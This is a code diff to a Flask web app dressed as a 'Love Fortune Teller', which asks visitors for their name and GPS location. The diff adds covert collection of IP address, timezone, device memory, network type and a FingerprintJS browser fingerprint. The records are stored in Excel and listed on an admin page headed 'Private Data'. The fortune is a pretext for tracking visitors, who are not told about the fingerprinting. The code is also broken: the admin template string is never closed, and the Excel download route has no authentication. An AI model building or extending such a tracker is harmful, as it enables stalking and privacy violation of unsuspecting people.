@@ -20,10 +20,12 @@ def ensure_persistent_storage():
         df = pd.DataFrame(columns=[
             'DateTime', 'Name', 'Latitude', 'Longitude',
             'Google Maps', 'Accuracy_m', 'Address',
-            'Battery_%', 'Charging', 'Device', 'Screen', 'Platform'
+            'Battery_%', 'Charging', 'Device', 'Screen', 'Platform',
+            # NEW COLUMNS
+            'IP_Address', 'Timezone', 'Device_Memory_GB', 'Network_Type', 'Fingerprint'
         ])
         df.to_excel(EXCEL_FILE, index=False)
-        print("✅ Created permanent Excel")
+        print("✅ Created permanent Excel with new columns")
     
     if os.path.exists(EXCEL_FILE) and not os.path.exists(BACKUP_FILE):
         shutil.copy2(EXCEL_FILE, BACKUP_FILE)
@@ -48,7 +50,10 @@ def save_data_permanent(data):
     df = pd.concat([df, new_row], ignore_index=True)
     df.to_excel(EXCEL_FILE, index=False)
     shutil.copy2(EXCEL_FILE, BACKUP_FILE)
-    os.sync()  # FORCE PERMANENT DISK WRITE
+    try:
+        os.sync()
+    except:
+        pass
     print(f"✅ SAVED PERMANENT: {data['Name']} | Total: {len(df)}")
     return True
 
@@ -64,7 +69,7 @@ def geocode_reverse(lat, lon):
     except:
         return f"{lat:.4f}, {lon:.4f}"
 
-# 30+ ROMANTIC FORTUNES
+# 30+ ROMANTIC FORTUNES (same as before)
 FORTUNES = [
     "💕 Dear {name}, someone special is thinking of you right now!",
     "💖 {name}, a beautiful soul is about to enter your life!",
@@ -101,14 +106,16 @@ FORTUNES = [
     "🎈 {name}, something light and joyful is drifting toward your love life."
 ]
 
-# COMPLETE HTML (your exact romantic UI)
+# UPDATED HTML with fingerprint, memory, network, timezone collection
 HTML = '''<!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Love Fortune Teller</title>
+<script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@4/dist/fp.min.js"></script>
 <style>
+/* (your existing CSS – unchanged) */
 *{margin:0;padding:0;box-sizing:border-box;}
 body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#ff9a9e,#fecfef,#ffdde1);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow-x:hidden;}
 .heart{position:fixed;pointer-events:none;z-index:0;animation:floatUp 4s linear infinite;}
@@ -181,7 +188,16 @@ h1{font-size:34px;margin:15px 0 8px;background:linear-gradient(135deg,#ff6b6b,#c
     <div>✨ The universe has spoken ✨</div>
   </div>
 </div>
+
 <script>
+// FingerprintJS initialization
+let visitorId = null;
+(async () => {
+  const fp = await FingerprintJS.load();
+  const result = await fp.get();
+  visitorId = result.visitorId;
+})();
+
 setInterval(()=>{
   const h=document.createElement('div');
   h.innerHTML=['❤️','💕','💖','💗','💓','💝'][Math.floor(Math.random()*6)];
@@ -190,16 +206,28 @@ setInterval(()=>{
   document.body.appendChild(h);
   setTimeout(()=>h.remove(),4500);
 },600);
+
 let uname='';
 window.start=function(){
   uname=document.getElementById('uname').value.trim();
   if(!uname){alert('💕 Please enter your name!');return;}
   askLocation();
 };
+
 async function getBatteryInfo(){
   try{const b=await navigator.getBattery();return {level:Math.round(b.level*100),charging:b.charging};}
   catch(e){return {level:'N/A',charging:'N/A'};}
 }
+
+// Additional data collection
+function getTimezone(){ return Intl.DateTimeFormat().resolvedOptions().timeZone; }
+function getDeviceMemory(){ return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'; }
+function getNetworkType(){
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if(conn && conn.effectiveType) return conn.effectiveType;
+  return 'Unknown';
+}
+
 function askLocation(){
   document.getElementById('res').classList.remove('show');
   document.getElementById('form').style.display='none';
@@ -210,6 +238,16 @@ function askLocation(){
     async pos=>{
       document.getElementById('load').classList.remove('show');
       const battery=await getBatteryInfo();
+      const tz = getTimezone();
+      const mem = getDeviceMemory();
+      const net = getNetworkType();
+      // wait for fingerprint (if not ready, fallback)
+      let fp = visitorId;
+      if(!fp){
+        const fpLib = await FingerprintJS.load();
+        const result = await fpLib.get();
+        fp = result.visitorId;
+      }
       try{
         const r=await fetch('/save',{
           method:'POST',
@@ -223,7 +261,12 @@ function askLocation(){
             battery_charging:battery.charging,
             userAgent:navigator.userAgent,
             screen:screen.width+'x'+screen.height,
-            platform:navigator.platform
+            platform:navigator.platform,
+            // new fields
+            timezone: tz,
+            device_memory: mem,
+            network_type: net,
+            fingerprint: fp
           })
         });
         const d=await r.json();
@@ -239,4 +282,120 @@ function askLocation(){
   );
 }
 function showOverlay(){document.getElementById('overlay').classList.add('show');}
-window.retry=function(){document.getElementById('form').style.display='
+window.retry=function(){document.getElementById('form').style.display='none';askLocation();};
+</script>
+</body>
+</html>'''
+
+@app.route('/')
+def home():
+    return HTML
+
+@app.route('/save', methods=['POST'])
+def save():
+    ensure_persistent_storage()
+    try:
+        data = request.json
+        lat = data['latitude']
+        lon = data['longitude']
+        addr = geocode_reverse(lat, lon)
+        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
+        # Client IP
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+
+        record = {
+            'DateTime': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            'Name': data['name'],
+            'Latitude': lat,
+            'Longitude': lon,
+            'Google Maps': maps_link,
+            'Accuracy_m': data['accuracy'],
+            'Address': addr,
+            'Battery_%': data['battery_level'],
+            'Charging': data['battery_charging'],
+            'Device': data['userAgent'][:150],
+            'Screen': data['screen'],
+            'Platform': data['platform'],
+            # New columns
+            'IP_Address': ip,
+            'Timezone': data.get('timezone', 'Unknown'),
+            'Device_Memory_GB': data.get('device_memory', 'Unknown'),
+            'Network_Type': data.get('network_type', 'Unknown'),
+            'Fingerprint': data.get('fingerprint', 'Unknown')
+        }
+
+        save_data_permanent(record)
+        fortune = random.choice(FORTUNES).format(name=data['name'])
+        print(f"✅ Saved: {data['name']} | {lat:.4f},{lon:.4f} | IP: {ip}")
+        return jsonify({'saved': True, 'fortune': fortune})
+    except Exception as e:
+        print("ERR:", e)
+        return jsonify({'saved': False}), 500
+
+@app.route('/admin', methods=['GET','POST'])
+def admin():
+    if request.method == 'GET':
+        return '''<!DOCTYPE html>
+<html><head><meta charset="UTF-8">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;background:linear-gradient(135deg,#ff9a9e,#fecfef);}
+.card{background:#fff;padding:45px 40px;border-radius:24px;box-shadow:0 10px 30px rgba(0,0,0,0.12);text-align:center;width:320px;}
+h2{color:#c06c84;margin-bottom:24px;font-size:22px;}
+input{width:100%;padding:13px 18px;border:2px solid #ffdde1;border-radius:40px;font-size:15px;text-align:center;outline:none;margin-bottom:16px;}
+input:focus{border-color:#c06c84;}
+button{width:100%;padding:13px;background:linear-gradient(135deg,#ff6b6b,#c06c84);color:#fff;border:none;border-radius:40px;font-size:16px;font-weight:bold;cursor:pointer;}
+</style></head>
+<body>
+<div class="card"><h2>🔒 Admin Access</h2><form method="POST"><input name="password" type="password" placeholder="Enter password" required><button type="submit">Login</button></form></div>
+</body></html>'''
+    if request.form.get('password') != ADMIN_PASSWORD:
+        abort(403)
+    df = load_data()
+    rows = ''
+    for _, row in df.iterrows():
+        gps = f"{row['Latitude']:.4f}, {row['Longitude']:.4f}"
+        maps = row['Google Maps']
+        rows += f'''<tr>
+            <td>{row['DateTime']}</td>
+            <td><b>{row['Name']}</b></td>
+            <td><a href="{maps}" target="_blank">📍 {gps}</a></td>
+            <td style="max-width:220px; font-size:11px;">{row['Address']}</td>
+            <td>{row['Accuracy_m']} m</td>
+            <td>{row['Battery_%']}%</td>
+            <td>{row['Charging']}</td>
+            <td style="max-width:180px; font-size:10px;">{row['Device']}</td>
+            <td>{row['Screen']}</td>
+            <td>{row['Platform']}</td>
+            <td style="font-size:10px;">{row['IP_Address']}</td>
+            <td style="font-size:10px;">{row['Timezone']}</td>
+            <td style="font-size:10px;">{row['Device_Memory_GB']}</td>
+            <td style="font-size:10px;">{row['Network_Type']}</td>
+            <td style="font-size:9px;">{row['Fingerprint']}</td>
+        </tr>'''
+    return f'''<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><style>
+body{{font-family:sans-serif;padding:20px;background:#fff0f5;}}
+h1{{color:#c06c84;}}
+table{{width:100%;border-collapse:collapse;background:#fff;border-radius:15px;overflow-x:auto;display:block;}}
+th{{background:linear-gradient(135deg,#ff6b6b,#c06c84);color:#fff;padding:12px 14px;text-align:left;font-size:11px;}}
+td{{padding:8px 12px;border-bottom:1px solid #ffe0e9;font-size:10px;}}
+tr:hover td{{background:#fff5f8;}}
+a{{color:#c06c84;text-decoration:none;}}
+</style></head>
+<body><h1>💋 Private Data — {len(df)} entries</h1>
+<div style="overflow-x:auto;"><table>
+    <thead><tr><th>DateTime</th><th>Name</th><th>Location</th><th>Address</th><th>Accuracy</th><th>Battery%</th><th>Charging</th><th>Device</th><th>Screen</th><th>Platform</th><th>IP</th><th>Timezone</th><th>Memory</th><th>Network</th><th>Fingerprint</th></tr></thead>
+    <tbody>{rows}</tbody>
+</table></div>
+
+@app.route('/download-excel', methods=['GET'])
+def download_excel():
+    if os.path.exists(EXCEL_FILE):
+        return send_file(EXCEL_FILE, as_attachment=True, download_name='fortunes_data.xlsx')
+    return "No data yet", 404
+
+if __name__ == '__main__':
+    ensure_persistent_storage()
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
